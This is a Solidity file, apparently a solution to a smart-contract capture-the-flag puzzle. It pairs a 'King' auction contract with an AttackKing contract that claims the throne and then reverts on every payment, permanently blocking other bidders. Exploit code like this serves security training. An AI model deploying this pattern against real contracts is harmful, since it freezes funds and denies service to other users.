

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract AttackKing {
    constructor(address payable _target) payable {
        // Become king by sending more than the current prize
        (bool success,) = _target.call{value: msg.value}("");
        require(success, "Failed to become king");
    }

    // Reject all incoming ether
    receive() external payable {
        revert("Cannot claim my throne!");
    }
}